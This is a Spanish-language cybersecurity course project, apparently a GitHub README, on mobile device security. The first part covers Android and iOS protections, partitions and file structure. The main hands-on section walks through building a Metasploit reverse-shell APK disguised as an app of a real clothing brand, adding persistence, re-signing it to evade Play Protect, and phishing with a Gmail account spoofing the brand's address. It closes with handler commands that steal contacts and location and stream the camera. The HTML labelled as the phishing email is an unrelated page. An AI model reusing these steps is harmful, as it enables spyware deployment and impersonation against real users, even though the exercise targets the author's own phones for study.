# PROYECTO

Este es el proyecto que realice en el curso de especialización de ciberseguridad en entornos de la tecnología de la información.

# 1. Estudio del problema y análisis del sistema 

## 1.1 Introducción 

En este proyecto se abordará en profundidad la seguridad de los dispositivos móviles, que hoy en día se han convertido en los instrumentos tecnológicos más utilizados en nuestro día a día. 

Con la proliferación de smartphones (que en 2024 se estima que superan los 6.000 millones a nivel mundial) y un uso diario, que en muchas regiones alcanza entre 5 y 7 horas, estos dispositivos se han integrado en casi todos los aspectos de nuestra vida.  

Desde la comunicación y el entretenimiento hasta las transacciones bancarias y la gestión de datos personales, los móviles contienen una enorme cantidad de información sensible. 

La dependencia a estos dispositivos no solo nos conecta al mundo de una manera sin precedentes, sino que también nos coloca en el centro de un creciente ecosistema de ciberataques.  

Cada vez que interactuamos con una app o navegamos por Internet a través de nuestro teléfono, estamos dejando “huellas digitales” que pueden ser explotadas por actores maliciosos, además, la evolución constante de los dispositivos y sistemas operativos trae consigo nuevas vulnerabilidades que requieren medidas de seguridad robustas para proteger la privacidad y la integridad de la información personal. 

##  1.2 Finalidad 

Se comprenderá, de manera práctica, dos aspectos esenciales de la seguridad en dispositivos móviles: 
**Almacenamiento de información** 

Ver dónde y de qué forma es almacenada la información en estos dispositivos, junto con la estructura interna de su sistema de archivos. 
También se verá la diferencia entre las diferentes versiones de los dispositivos móviles. 

**Infección y protección de un móvil**

Se procederá a ver la forma en la que se puede infectar un dispositivo móvil y que herramientas o medidas podemos tomar para poder mitigar las posibles amenazas e incidentes que pueden ocurrir en un dispositivo móvil. 


## 1.3 Objetivos

**Conocer el proceso de extracción de información en móviles**

Ampliar el conocimiento sobre los métodos y herramientas que permiten acceder a los datos almacenados en dispositivos móviles.  

Aprendiendo diferentes técnicas forenses digitales para extraer, analizar y preservar información de forma segura, garantizando la integridad de los datos extraídos durante el proceso.

**Infectar y desinfectar un dispositivo móvil**

Familiarizarse con los vectores de infección y los tipos de malware que pueden afectar a los móviles, así como con las técnicas utilizadas para propagar estos agentes.  

De igual forma, se estudiarán y aplicarán métodos para eliminar dicho malware, tales como el uso de software antimalware, actualizaciones del sistema o restauraciones del dispositivo a un estado seguro, evaluando la eficacia de cada estrategia de “desinfección”.

**Tomar medidas para la protección de la ciberseguridad en los dispositivos móviles**

Se identificarán y aplicarán buenas prácticas y técnicas de ciberseguridad para prevenir la infección de los dispositivos. 

# 2. Recursos 
## 2.1 Recursos Hardware

![image](https://github.com/user-attachments/assets/a0f4124e-2586-44e9-81ca-b3177f4c80ae)

## 2.2 Recursos Software 

![image](https://github.com/user-attachments/assets/aaff84bd-3025-4926-b979-b86e77f7dabd)

# 3. Planificación

## 3.1 Planificación temporal 

Aquí podemos visualizar una tabla y un gráfico con la planificación temporal que esperaba llevar a cabo. Los colores de cada tarea van relacionados con los colores en el gráfico. 
El número que vemos dentro de cada barra corresponde al nº de horas estimadas. El inicio y el final de cada barra, está relacionada con el día de inicio y el día de finalización de esa tarea.

![image](https://github.com/user-attachments/assets/070befc5-c6c3-458a-9e25-9e1637cef1e6)

↓

![image](https://github.com/user-attachments/assets/8a153765-6875-4a67-a599-6d90f10803b0)

## 3.2 Planificación económica

![image](https://github.com/user-attachments/assets/8301cd81-2e05-4c7f-b3ad-8ae3796a5298)

---

# 4. Desarrollo y pruebas

## 4.0 Sistemas operativos disponibles en móviles 

### 4.0.1 Android

##### 4.0.1.1 Seguridad

Android al ser un SO abierto y que permite modificaciones, también es más vulnerable, permitiendo la instalación de apps desde orígenes no conocidos (APK) que pueden traer algún tipo de malware. 

Android cuenta con el Google Play Protect que es el servicio de protección antimalware nativo y que viene integrado con Google Mobile Services, el cual analiza y escanea las apps instaladas en el dispositivo para ver si estas cuentan con los permisos adecuados y con la firma de Google. 

También identifica amenazas basadas en las firmas estáticas y en el comportamiento de las aplicaciones instaladas y en caso de encontrar una, es capaz de eliminar los permisos que tenga la misma y avisar al usuario.

Una característica que tienen los dispositivos Android es el rooteo. 

Este es un proceso en el cual un usuario obtiene privilegios de root en el dispositivo móvil, permitiendo realizar cualquier acción en el mismo. 

Aunque es bastante peligroso y poco recomendable, ya que al realizar el rooteo de un dispositivo móvil, un malware podría acceder a datos sensibles o incluso controlar el propio dispositivo. 

El propio rooteo podría desactivar funciones de seguridad aumentando las vulnerabilidades del sistema o durante el proceso del rooteo, se podría quedar inservible si lo hacemos mal. 

Además, muchos fabricantes anulan la garantía del dispositivo si este ha sido rooteado. 

#### 4.0.1.2 ¿Qué soluciones ofrece Android si mi móvil se ha infectado con malware?

Está la ya mencionada Google Play Protect la cual analiza y protege nuestro dispositivo de apps maliciosas. 

También podemos arrancar en modo seguro en el cual se iniciará el móvil solo con las aplicaciones nativas, permitiendo desinstalar las apps maliciosas.

En caso de no poder desinfectarlo, cada fabricante/marca tiene un centro de soporte donde ponernos en contacto directamente con el fabricante, los cuales nos brindarán ayuda. 

Como última opción, está el restablecimiento de fábrica, donde se eliminan todos los datos del móvil.

### 4.0.2 IOS 

#### 4.0.2.1 Seguridad 

Como especifique anteriormente, iOS no puede ser modificado por nadie, salvo por Apple, asi que no se pueden obtener aplicaciones de fuentes desconocidas (APK) y que no estén dentro de la App Store de Apple, haciéndolo ya por defecto, más seguro. 

Además, cada app en iOS corre dentro de su propio sandbox y no puede acceder a datos de otras aplicaciones o del sistema de forma directa. 

A partir del año 2014 - iOS 8 - todos los datos del dispositivo como foto, correos y mensajes están cifrados por defecto y solo son accesibles con el código de desbloqueo del usuario. 

A diferencia de Android, Apple no realiza actualizaciones de seguridad de forma mensual, si no que cuando lanza una nueva versión de iOS (por ejemplo, iOS 18) a lo largo de esa versión, lanza versiones menores (iOS 18.1, 18,2 etc) que contienen esas correcciones de seguridad. 

Apple es quien controla la distribución de las actualizaciones, cuando se lanza una nueva versión, esta se encontrará disponible para todos los dispositivos compatibles de forma simultánea. 

En iOS, el rooteo es llamado **jailbreak**. 
La principal diferencia es que Apple no permite realizar el jailbreak y hacerlo es notablemente más difícil. 

El jailbreak tiene las mismas consecuencias que el rooteo en Android, puedes acceder a todo el dispositivo e incluso instalar aplicaciones que no están disponibles, pero a cambio de inestabilidad, exposición a malware, no poder acceder a actualizaciones de iOS y perder la garantía del dispositivo. 

#### 4.0.2.2 ¿Qué soluciones ofrece Apple si mi móvil se ha infectado con malware?

Las soluciones son similares a las de Android, eliminar cualquier app sospechosa, realizar un reinicio del dispositivo, mantenerlo actualizarlo, usar diferentes herramientas de diagnóstico etc. 

En caso de que nada de esto funcione, Apple cuenta con un soporte técnico, donde se puede obtener una asistencia más especializada.

---

Como expuse anteriormente, los fabricantes y empresas de móviles, usan una versión propia de Android, que se diferencian entre sí. 

Estos cambios también están presentes en la estructura del sistema de archivos y el cómo se organizan los datos almacenados y las particiones en Android.

Para poder compararlos, voy a usar 3 dispositivos:

- Xiaomi Redmi Note 9 – MIUI 13.0.3 – Android 12
- Huawei P8 Lite 2017 – EMUI 8.0 – Android 8.0
- Google Pixel 8 – Android 15

Los 2 primeros, son dispositivos físicos que yo tengo, mientras que el Google Pixel 8, lo 
emularé con el software Android Studio. 

En el proyecto solo he agregado la parte del análisis del Google Pixel, la parte del análisis de los móviles se encuentra en el **Anexo II**. 
Esto lo hago ya que el Google Pixel tiene la versión de Android más pura y actualizada, siendo más interesante de analizar que las otras 2 versiones.

### 4.1.1 Android Studio 

**Android Studio** es un entorno de desarrollo integrado (IDE) usado principalmente para desarrollar aplicaciones para Android. 

Proporciona un conjunto completo de herramientas que facilitan el diseño, codificación, prueba y depuración de apps para dispositivos Android. 

Entre sus funcionalidades se encuentra la de emular dispositivos móviles, en concreto, los dispositivos **Google Pixel**. 

Esto ayuda a los desarrolladores a crear sus aplicaciones ya que estos móviles emulados funcionan igual que una máquina virtual. 

También se pueden ver los directorios y editar los archivos del móvil emulado, por lo que es una funcionalidad muy interesante y útil. 

Otra funcionalidad es que, al conectar un móvil, **Android Studio** lo reconoce y nos permite hacer lo mismo que con el móvil emulado. 

En este proyecto, solo se va a tratar la emulación de móviles, el resto de las funcionalidades y características del software no van a ser enseñadas ya que no son necesarias. 

En el **Anexo I** hablo más a fondo sobre esta herramienta y enseño como la he usado.

---

### 4.1.2 Particiones en Android

En Android las particiones son diferentes que en Windows o en GNU/Linux.

En estos sistemas operativos, hay unas pocas particiones que se crean por defecto, como la 
partición de recuperación o la de swap. 

En cambio, en Android, se crean muchas más: 

![image](https://github.com/user-attachments/assets/0643401f-73cc-4b98-af11-937a2ccd2260)

#### 4.1.2.1 Partición SUPER 

Como dije, la partición super cuenta con varias particiones lógicas dentro de sí misma y es que a partir de Android 11, hubo un cambio y varias particiones físicas se agruparon en la partición super. 

![image](https://github.com/user-attachments/assets/8eb6f8f9-2308-4d14-ba75-31e001bd50e1)

Esta imagen representa el modelo de particiones lógicas que hay dentro de la partición super, donde se separa el sistema base de Android **(product interface)** del código específico para cada región / país **(vendor interface)**. 

#####  4.1.2.1.1 Product interface

![image](https://github.com/user-attachments/assets/73501e96-72a5-4985-8948-b6b6b0b01f02)

##### 4.1.2.1.2 Vendor interface

![image](https://github.com/user-attachments/assets/b9d96ce8-769b-45c5-90df-35b8c7579ca0)

En resumen, system es la base del sistema, lo que todos los dispositivos Android traen por defecto, independientemente del fabricante, hardware o versión diferente de Android. 
El resto de las particiones traen configuraciones específicas para cada dispositivo, según la región de este, hardware y sistema operativo que tenga. 

Cuando se lanza una nueva actualización de Android, Google actualiza system, mientras que el fabricante (con su propio sistema) actualiza el resto de las particiones.

#### 4.1.2.2 Particiones en Android 15

No puedo mostrar todas las particiones en el dispositivo Android, ya que, al emularlo, no se generaron todas las particiones que he analizado y mostrado previamente, ya que en la emulación, no son necesarias para que funcione el dispositivo. 

Igualmente, para ver las particiones en un Android, se usa el comando: 

```bash
ls -l /dev/block/by-name
```

![image](https://github.com/user-attachments/assets/cd05fad2-86c4-4821-b38f-1adc3fa3010a)

En la imagen solo se pueden apreciar 3 particiones que he mencionado, metadata, super y vbmeta.

vda y vdd hacen referencia a virtual disk A y virtual disk D. La letra no significa nada, solo especifica el orden de los discos virtuales.

---

### 4.1.3 Estructura en Android  

Para ver la estructura de archivos en los dispositivos, nos conectamos al móvil a través del terminal y vemos su contenido. 

```bash
adb shell  
ls 
```

Como Android está basado en Linux, hay muchas carpetas iguales y que cumplen la misma función como las  /etc, /bin, /dev, /tmp, /sys etc. 

Dentro del Pixel 8 encontramos lo siguiente: 

![image](https://github.com/user-attachments/assets/77dde45a-5bca-4979-acc6-37ed66f4ea3c)

#### 4.1.3.1 Sistema base 

![image](https://github.com/user-attachments/assets/bf4abf54-75fe-4bb1-a930-6c497bb9c4da)

#### 4.1.3.2 Datos del usuario y aplicaciones

![image](https://github.com/user-attachments/assets/2d91c1e7-e102-4751-ab36-062886e98119)

#### 4.1.3.3 Arranque y configuración 

![image](https://github.com/user-attachments/assets/b0860b8d-9c82-4c02-86bd-5587b8ac551d)

#### 4.1.3.4 Información en tiempo real 

![image](https://github.com/user-attachments/assets/88893167-477d-4184-8e3a-c39f3ebb45df)

#### 4.1.3.5 Logs y temporales 

![image](https://github.com/user-attachments/assets/1c994e53-4f9d-4db1-a35a-2416579d4526)

---

## 4.2 Arranque en un dispositivo móvil Android 

El proceso de arranque en los dispositivos Android es bastante similar, sobre todo en las versiones más recientes, pero entre fabricantes hay una serie de cambios: 

![image](https://github.com/user-attachments/assets/579ca81f-82f5-4881-bc73-4e790554e9f8)

---

## 4.3 Infectar móvil

Voy a crear una pk que se hará pasar por una aplicación de la marca de ropa Kimoa. 

Al ejecutarse, esta no sacará nada por pantalla, si no que creará un proceso en 2º plano persistente (para que Android no mate el proceso a los pocos segundos) el cual me permitirá conectarme al móvil desde metaspoitable y ejecutar una serie de comandos para extraer información del móvil (contactos, acceso a cámara, ubicación etc). 

Para simular un caso de ataque realista, se mandará un correo electrónico a una cuenta de Gmail que se encuentra en el móvil. En el correo se anunciará la nueva aplicación de Kimoa, pidiéndole al usuario que la descargue para obtener ofertas y ventajas exclusivas. 

### 4.3.1 Crear APK

Para poder crear la APK usaré msfvenom. 
Esta es una herramienta integrada con Metasploit la cual permite generar payloads maliciosos. 
El comando es el siguiente:

```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.143 LPORT=4444 -o kimoa3.apk 
```

![image](https://github.com/user-attachments/assets/7de968dc-8447-4abd-928b-8b8121d7abe7)

**-p** – Indica el payload, en este caso meterpreter inverso.
**LHOST** – IP del atacante. 
**LPORT** – Puerto de escucha.
**-o** – Archivo generado.

Meterpreter es un payload el cual permite controlar un sistema ejecutando una serie de comandos y en este caso, estoy especificando que la conexión se inicie desde la víctima al atacante. 
Esto en práctica quiere decir que hasta que la víctima no ejecute la APK, no se establecerá la conexión.

### 4.3.2 Modificar APK

Antes de mandar la APK por correo, hay que modificarla para hacerla pasar por la aplicación de Kimoa. 
La descomprimo, usando el comando: 

```bash
apktool d kimoa3.apk -o kimoa4
```

![image](https://github.com/user-attachments/assets/c6fa3723-888c-473a-a615-d6879496a125)

Dentro del directorio generado se ve lo siguiente:

![image](https://github.com/user-attachments/assets/7147240e-1800-46be-b6e6-ac4e7bdb2c3a)

Esta es la estructura de la APK, donde el archivo más importante es el archivo AndroidManifest.xml, ya que es donde se configura el comportamiento de la aplicación, los permisos que necesitará, el nombre de la aplicación, los servicios que creará etc.

El contenido del archivo es el siguiente:

```bash
<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest 
xmlns:android="http://schemas.android.com/apk/res/android" android:compileSdkVersion="33" 
android:compileSdkVersionCodename="13.0.0" package="com.metasploit.stage" 
platformBuildVersionCode="33" platformBuildVersionName="13.0.0"> 
    <uses-permission android:name="android.permission.INTERNET"/> 
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/> 
    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/> 
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/> 
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/> 
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/> 
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/> 
    <uses-permission android:name="android.permission.SEND_SMS"/> 
    <uses-permission android:name="android.permission.RECEIVE_SMS"/> 
    <uses-permission android:name="android.permission.RECORD_AUDIO"/> 
    <uses-permission android:name="android.permission.CALL_PHONE"/> 
    <uses-permission android:name="android.permission.READ_CONTACTS"/> 
    <uses-permission android:name="android.permission.WRITE_CONTACTS"/> 
    <uses-permission android:name="android.permission.WRITE_SETTINGS"/> 
    <uses-permission android:name="android.permission.CAMERA"/> 
    <uses-permission android:name="android.permission.READ_SMS"/> 
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/> 
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/> 
    <uses-permission android:name="android.permission.SET_WALLPAPER"/> 
    <uses-permission android:name="android.permission.READ_CALL_LOG"/> 
    <uses-permission android:name="android.permission.WRITE_CALL_LOG"/> 
    <uses-permission android:name="android.permission.WAKE_LOCK"/> 
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/> 
    <uses-feature android:name="android.hardware.camera"/> 
    <uses-feature android:name="android.hardware.camera.autofocus"/> 
    <uses-feature android:name="android.hardware.microphone"/> 
    <application android:label="@string/app_name"> 
        <activity android:label="@string/app_name" android:name=".MainActivity" 
android:theme="@android:style/Theme.NoDisplay"> 
            <intent-filter> 
                <action android:name="android.intent.action.MAIN"/> 
                <category android:name="android.intent.category.LAUNCHER"/> 
            </intent-filter> 
            <intent-filter> 
                <data android:host="my_host" android:scheme="metasploit"/> 
                <category android:name="android.intent.category.DEFAULT"/> 
                <category android:name="android.intent.category.BROWSABLE"/> 
                <action android:name="android.intent.action.VIEW"/> 
            </intent-filter> 
        </activity> 
        <receiver android:label="MainBroadcastReceiver" android:name=".MainBroadcastReceiver"> 
            <intent-filter> 
                <action android:name="android.intent.action.BOOT_COMPLETED"/> 
            </intent-filter> 
        </receiver> 
        <service android:exported="true" android:name=".MainService"/> 
    </application> 
</manifest>
```

Dentro de este código se puede ver:

**Nombre del paquete**

![image](https://github.com/user-attachments/assets/c6feb0ca-2a0c-4691-bc07-abe8c49947cd)

El nombre del paquete lo voy a dejar asi, ya que es muy difícil cambiarlo y me va a servir para el análisis forense posterior. 

![image](https://github.com/user-attachments/assets/65638bd8-4869-4027-9bf3-2c59b9efc65b)

El nombre de la aplicación por defecto es **MainActivity** por lo que hay que cambiarlo.

![image](https://github.com/user-attachments/assets/5b394f96-6062-420d-aeae-e0745e50a799)

Habrá que crear un nuevo servicio el cual sea persistente, para que Android no mate el proceso a los pocos segundos. 

**Permisos requeridos**

![image](https://github.com/user-attachments/assets/0d18d654-998c-42c8-a7ea-27caff6b27a0)

La primera modificación que hago es modificar el nombre y el icono de la APK. 

El nombre de la APK se encuentra en **res/values/strings.xml**. 

![image](https://github.com/user-attachments/assets/1a50ff8a-3abb-491d-8da0-110d73d6868f)

Para añadir el icono, se ha de crear el directorio **res/drawable** y dentro del mismo colocar el icono:

![image](https://github.com/user-attachments/assets/74b1ed48-bf57-4a40-ac67-be9b94129b08)

El icono es el siguiente:

![image](https://github.com/user-attachments/assets/4672759f-5167-410e-9e2e-1f4058cbd610)

Además, dentro del código de AndroidManifest.xml hay que añadir la siguiente línea de código:

```bash
android:icon=”@drawable/ic_launcher”
```

![image](https://github.com/user-attachments/assets/3da396e2-c6b1-45dd-bacd-2393deb806b6)

El siguiente paso es crear el nuevo servicio persistente. 
Dentro del **AndroidManifest.xml** hay que añadir el siguiente código: 

```bash
<service android:name=”com.metasploit.stage.PersistentService” android:enable=”true” android:exported=”false”/>
```

![image](https://github.com/user-attachments/assets/b0fbb216-8bd0-47ae-8003-0056bbf8fed2)

Ahora, hay que crear el archivo del servicio, dentro de **smali/com/metasploit/stage** el cual contiene el siguiente código:

```bash
.class public Lcom/metasploit/stage/PersistentService; 
.super Landroid/app/Service; 
.source "PersistentService.java" 
  
# static fields 
.field private static final CHANNEL_ID:Ljava/lang/String; = "KimoaChannel" 
  
# direct methods 
.method public constructor <init>()V 
    .locals 0 
    invoke-direct {p0}, Landroid/app/Service;-><init>()V 
    return-void 
.end method 
  
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder; 
    .locals 1 
    const/4 v0, 0x0 
    return-object v0 
.end method 
  
.method public onCreate()V 
    .locals 2 
  
    invoke-super {p0}, Landroid/app/Service;->onCreate()V 
  
    return-void 
.end method 
  
.method public onStartCommand(Landroid/content/Intent;II)I 
    .locals 0 
    const/4 p0, 0x1 
    return p0 
.end method
```

Ahora voy a quitar los permisos innecesarios. Cuando se ejecute la APK, ejecutaré los siguientes comandos: 

**check_root** – Se comprueba si el móvil esta rooteado o no 
**dump_contacts** – Obtiene toda la lista de contactos 
**geolocate** – Informacion de ubicación 
**webcam_stream** – Inicia una grabación de la cámara 
Para ello, la APK necesita los siguientes permisos:

```bash
<!-- Permisos esenciales para la conexión --> 
<uses-permission android:name="android.permission.INTERNET"/> 
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/> 
<!-- Permisos para los comandos específicos --> 
<uses-permission android:name="android.permission.READ_CONTACTS"/> <!-- dump_contacts --> 
<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/> <!-- geolocate --> 
<uses-permission android:name="android.permission.CAMERA"/> <!-- webcam_stream y 
screenshot --> 
<uses-permission android:name="android.permission.WAKE_LOCK"/> <!-- Para mantener activo --> 
<!-- Features necesarios --> 
<uses-feature android:name="android.hardware.camera"/> 
<uses-feature android:name="android.hardware.camera.autofocus"/>
```

Con lo que el código termina de la siguiente forma:

![image](https://github.com/user-attachments/assets/490b71f1-d6bc-4696-9a4a-c0b8a5ce8228)

### 4.3.3 Compilar APK 

Con los cambios realizados, compilo de nuevo la APK.

```bash
apktool b kimoa3 -o kimoa.apk
```

![image](https://github.com/user-attachments/assets/2c6a283e-6647-413a-85ba-e2a40bd548ee)

Para que esta sea menos reconocible por cualquier antivirus o por los propios servicios de Google Play Protect, he de crear una keystore. Una keystore es un archivo que contiene diferentes claves criptográficas que se usa para firmas aplicaciones, garantizando su autenticidad. 

La creo con el siguiente comando: 

```bash
keytool -genkey -v -keystore kimoa.keystore -alias kimoakey -keyalg RSA -keysize 2048 validity 10000
```

![image](https://github.com/user-attachments/assets/753b9561-296f-42c5-9ea9-0a319cc6e98f)

Y firmo la APK con el siguiente comando:

```bash
jarsigner –verbose -sigalg SHA256withRSA -digestalg SHA-256 -keystore kimoa.keystore kimoa.apk kimoakey 
```

![image](https://github.com/user-attachments/assets/7defb2cf-5eb3-42f2-b3f2-2b56b949cf85)

Para terminar, optimizo la APK con zipalign. Esta es una herramienta de Android SDK la cual optimiza el rendimiento de la APK. 

```bash
zipalign -v 4 kimoa.apk kimoa1.apk 
```

![image](https://github.com/user-attachments/assets/0da0c255-a8d1-49cf-a9fb-85fc2fd2ac07)

### 4.3.4 Crear correo malicioso

Ya con la APK creada, paso al siguiente punto, el cual es, crear la cuenta de correo electrónico, al cual se hará pasar por una cuenta real de Kimoa. 

Lo primero es ver las cuentas de correo de las que dispone Kimoa. 
Como yo estoy registrado en su sitio web, me mandan correos donde me anuncian descuentos y demás, asi que puedo ver que cuentas de correo usan. 

Uno de los correos es el siguiente:


![image](https://github.com/user-attachments/assets/7afeae50-54bf-416c-8b13-e2e7e9740d38)


La cuenta de correo que se observa en la imagen es *info@kimoa.com* y el nombre de la cuenta de correo es Kimoa. 

También se puede observar cómo se estructura el asunto del correo, además de la foto del perfil, la cual usaré.

Con esta informacion, lo que voy a hacer es crear una cuenta de Gmail que sea lo más parecida posible a esta cuenta de Kimoa. 
La cuenta será *inf0kimoa.com@gmail.com* y su nombre será *info@kimoa.com* asi, haciéndose pasar por la cuenta original, además de que su foto de perfil será la misma que la de la cuenta original. 

![image](https://github.com/user-attachments/assets/812b059e-77d5-4c40-8d6a-ab121a6d5b5f)

Con la cuenta creada, solo queda redactar el correo electrónico de tal forma que parezca lo más realista posible y mandar el enlace con la aplicación. 

Los correos que manda la gente de Kimoa, tienen un código HTML integrado, donde tienen un color de fondo y una imagen en la que se muestra el motivo correo, ya sea que anuncian nuevos productos, descuentos etc:

![image](https://github.com/user-attachments/assets/44319c74-3197-4fcb-b359-1aa5fc186591)

En mi caso, voy a generar una imagen con la herramienta Sora en la cual se muestre el anuncio de una nueva aplicación por parte de Kimoa y la voy a integrar en el siguiente código HTML. 

```bash
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Prácticas</title>
  <style>
    ul { list-style-type: none; }
    .folder { cursor: pointer; font-weight: bold; }
    .hidden { display: none; margin-left: 20px; }
  </style>
</head>
<body>
  <h1>Prácticas ASIR y CETI</h1>

  <ul>
    <li>
      <span class="folder" onclick="toggle(this)">ASIR</span>
      <ul class="hidden">
        <li>
          <span class="folder" onclick="toggle(this)">1º AÑO</span>
          <ul class="hidden">
            <li>
              <span class="folder" onclick="toggle(this)">Fundamentos de hardware</span>
              <ul class="hidden">
                <li>
                  <span class="folder" onclick="toggle(this)">UT1</span>
                  <ul class="hidden">
                    <li><a href="practicas/asir/1/fundamentos/ut1/practica1.md" target="_blank">Práctica 1</a></li>
                    <li><a href="practicas/asir/1/fundamentos/ut1/practica2.md" target="_blank">Práctica 2</a></li>
                  </ul>
                </li>
              </ul>
            </li>
          </ul>
        </li>
        <!-- Puedes añadir 2º AÑO aquí -->
      </ul>
    </li>

    <li>
      <span class="folder" onclick="toggle(this)">CETI</span>
      <ul class="hidden">
        <li>
          <span class="folder" onclick="toggle(this)">Análisis Forense</span>
          <ul class="hidden">
            <li>
              <span class="folder" onclick="toggle(this)">UT1</span>
              <ul class="hidden">
                <li><a href="practicas/ceti/forense/ut1/practica1.md" target="_blank">Práctica 1</a></li>
              </ul>
            </li>
          </ul>
        </li>
      </ul>
    </li>
  </ul>

  <script>
    function toggle(element) {
      const next = element.nextElementSibling;
      if (next && next.classList.contains('hidden')) {
        next.classList.remove('hidden');
      } else if (next) {
        next.classList.add('hidden');
      }
    }
  </script>
</body>
</html>
```

El correo se ve de la siguiente manera:

![image](https://github.com/user-attachments/assets/3b10f497-cf1d-4830-ab84-eb48a8e63a26)

El botón de “Descargar ahora” nos lleva a un enlace de la plataforma Mega en la cual se encuentra subida la APK. 

No he podido integrarla dentro del propio correo ya que Gmail la detecta como maliciosa y manda el correo, pero eliminando la aplicación. Tampoco he podido subirla a Google Drive por el mismo motivo. 

### 4.3.5 Ataque en Huawei 

Con todo listo, realizare el ataque en el Huawei P8 LITE 2017. 

Dentro del teléfono móvil tengo una cuenta de correo a la cual mando el correo anteriormente mostrado: 

![image](https://github.com/user-attachments/assets/3ae98bf7-7a11-4197-b29d-93e564310220)

El correo ha sido mandado por una cuenta llamada info@kimoa.com, con el logo de la marca de ropa Kimoa. 

Dentro del correo se encuentra una imagen donde se anuncia una nueva aplicación para dispositivos Android y un enlace de descarga: 

![image](https://github.com/user-attachments/assets/fcf36334-7d94-4bbb-a707-245d522db09e)

El enlace de descarga nos lleva a la plataforma Mega, donde se encuentra la aplicación:

![image](https://github.com/user-attachments/assets/432d8eac-417e-429d-9c3b-690e37d816be)

A la hora de descargarlo, el propio navegador nos informa de que el archivo puede ser dañino, aun así, lo descargo. 

![image](https://github.com/user-attachments/assets/98a2ab6c-ffda-487b-bee8-d12780f9ff21)

Ya en el móvil, la aplicación me solicita los permisos de cámara, acceso a los contactos y de ubicación.

![image](https://github.com/user-attachments/assets/1b39388b-8735-47a4-8b8f-571feced0633)

Al dar los permisos, salta un mensaje de Google Play Protect, donde se indica que es la primera vez que se detecta esta aplicación y nos da la posibilidad de analizarla o no.

![image](https://github.com/user-attachments/assets/750925ef-56cc-4093-a844-ed9b0a4ff263)

Este mensaje siempre va a salir, ya que las aplicaciones que se encuentran en la Play Store contienen 2 firmas, la de la desarrolladora y la de Google, indicando que esta última se ha encargado de verificar que la aplicación no es maliciosa. Al no disponer mi aplicación de esta firma, sale el mensaje. 

En **“Más detalles”** tenemos la opción de instalar la aplicación sin analizar.

![image](https://github.com/user-attachments/assets/edcdb74d-1fae-4e64-a60a-cb8d3e14392b)

Al instalar la aplicación e intentar abrirla por primera vez, el propio sistema operativo del teléfono me indica que la aplicación es un virus y que he de desinstalarla. 

Hago caso omiso.

![image](https://github.com/user-attachments/assets/c403ee83-6604-4d08-ad37-dfaccdd55d12)

Ya instalada en el equipo, lanzo el ataque desde metasploitable.  

Al iniciar la aplicación, se inicia la conexión a metaspoitable, donde podemos ejecutar comandos y obtener información del teléfono móvil. 

Los comandos son los siguientes:

```bash
msfconsole 
use exploit/multi/handler 
set payload android/meterpreter/reverse_tcp 
set LHOST 192.168.1.143 
set LPORT 444 
run 
```

![image](https://github.com/user-attachments/assets/ebfabe3f-6552-4ca7-82b1-f691bd038a20)

En el móvil, inicio la aplicación, pero no sale nada. A la vista del dueño del móvil, la aplicación simplemente no se ha iniciado, pero el atacante está dentro del terminal.

Ya conectado, ejecuto el comando resource **/opt/Kimoa/auto.rc**. 

![image](https://github.com/user-attachments/assets/54fa78e9-31a7-480f-9b96-350999dc9642)

Este comando lo que hace es ejecutar los comandos que se encuentran en el archivo **/opt/Kimoa/auto.rc** que son los siguientes: 

![image](https://github.com/user-attachments/assets/7afe21c2-620c-41b6-a768-de957bf51a0e)

```bash
check_root – Verifica si el móvil está rooteado o no 
dump_contacts – Obtiene los contactos del móvil 
geolocate – Obtiene la ubicación en la que se encuentra el móvil 
webcam_stream – Inicia una grabación de la cámara 
```

![image](https://github.com/user-attachments/assets/7fccde2e-4654-4696-acfd-3a6cc8408b9a)

El comando **check_root** nos dice que el dispositivo no está rooteado: 

![image](https://github.com/user-attachments/assets/87ac3744-a288-468b-91f0-1529551858e1)

El comando **dump_contacts** genera un archivo con los contactos almacenados en el dispositivo.

![image](https://github.com/user-attachments/assets/79884fd6-b7b5-4b09-b390-ef207bed43b3)

El contenido del fichero es el siguiente: 

![image](https://github.com/user-attachments/assets/6008a21c-d1ac-4eb4-8d34-a11f90de1aa1)

El comando **geolocate** nos da la ubicación del móvil: 

![image](https://github.com/user-attachments/assets/f58be600-a6e0-43cc-9830-2afcb10ae6aa)

Si pongo esa ubicación en google maps, me saca la dirección de mi casa (la ubicación no es 100% precisa).

![image](https://github.com/user-attachments/assets/c3af9e82-ee0d-4c19-be8d-578e8098541a)

El ultimo comando es **webcam_stream** el cual abre el navegador e inicia una grabación del cámara en el navegador. 


![image](https://github.com/user-attachments/assets/100d846c-b91f-4929-a1f8-f33a83170cfa)

↓

![image](https://github.com/user-attachments/assets/b054fb4e-3d54-4825-9c6c-35ac2ee1eeee)

### 4.3.6 Diferencias en Xiaomi 

A la hora de instalar la aplicación en Xiaomi, el aviso de Google Play Protect es diferente y nos dice que la aplicación no es segura. Aun asi, nos da la opción de instalarla de todas formas.

![image](https://github.com/user-attachments/assets/bad2be17-cf0e-42d1-ba0b-ebcd7b9baba7)

Al instalarla, el propio sistema realiza un análisis de seguridad, en el cual sale que la aplicación es segura, a diferencia que en el Huawei, donde se especificaba que era un virus.

![image](https://github.com/user-attachments/assets/93b23cb4-5def-4510-b7ce-3aeb6b506425)

El siguiente paso es aceptar los permisos requeridos por la aplicación. 

![image](https://github.com/user-attachments/assets/c44a40f6-b9db-4c5c-9e11-775606f287e3)

Acto seguido, se nos informa de que la aplicación está diseñada para una versión de Android anterior a la instalada (Android 12) y que puede que no funcione

![image](https://github.com/user-attachments/assets/a285128d-cec3-4240-ad2c-e2fc846d7337)

